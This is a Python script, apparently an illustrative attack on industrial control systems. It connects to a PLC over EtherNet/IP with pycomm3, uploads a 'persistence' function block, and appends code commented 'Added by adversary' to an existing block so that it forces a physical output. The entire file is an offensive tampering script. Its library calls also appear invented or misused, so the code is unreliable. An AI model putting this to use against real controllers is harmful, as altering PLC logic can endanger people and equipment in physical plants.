import pycomm3
import socket
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    # You can use a network scanner to find the PLC's IP address
    # For simplicity, we'll use a hardcoded IP address here
    return '192.168.1.100'

# Function to connect to the PLC
def connect_to_plc(ip_address):
    try:
        plc = pycomm3.CipDriver(ip_address)
        if plc.open():
            print(f"Connected to PLC at {ip_address}")
            return plc
        else:
            print(f"Failed to connect to PLC at {ip_address}")
            return None
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return None

# Function to modify the PLC program
def modify_plc_program(plc):
    try:
        # Example: Add a new function block to the PLC
        new_function_block = """
        FUNCTION_BLOCK FB_Persistence
        VAR_INPUT
            Enable: BOOL;
        END_VAR
        VAR_OUTPUT
            Status: BOOL;
        END_VAR
        VAR
            Counter: INT;
        END_VAR

        IF Enable THEN
            Counter := Counter + 1;
            IF Counter > 100 THEN
                Status := TRUE;
            ELSE
                Status := FALSE;
            END_IF
        ELSE
            Counter := 0;
            Status := FALSE;
        END_IF
        END_FUNCTION_BLOCK
        """

        # Upload the new function block to the PLC
        plc.upload('FB_Persistence', new_function_block)
        print("Function block 'FB_Persistence' uploaded successfully")

        # Example: Modify an existing function block
        existing_function_block = plc.download('FB_Existing')
        if existing_function_block:
            modified_function_block = existing_function_block + """
            // Added by adversary
            IF FB_Persistence.Enable THEN
                // Perform some malicious action
                // For example, set a digital output
                %QX0.0 := TRUE;
            END_IF
            """
            plc.upload('FB_Existing', modified_function_block)
            print("Function block 'FB_Existing' modified successfully")
        else:
            print("Failed to download existing function block 'FB_Existing'")

    except Exception as e:
        print(f"Error modifying PLC program: {e}")

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()

    # Connect to the PLC
    plc = connect_to_plc(plc_ip)
    if plc:
        # Modify the PLC program
        modify_plc_program(plc)

        # Close the connection
        plc.close()
        print("Connection to PLC closed")

if __name__ == "__main__":
    main()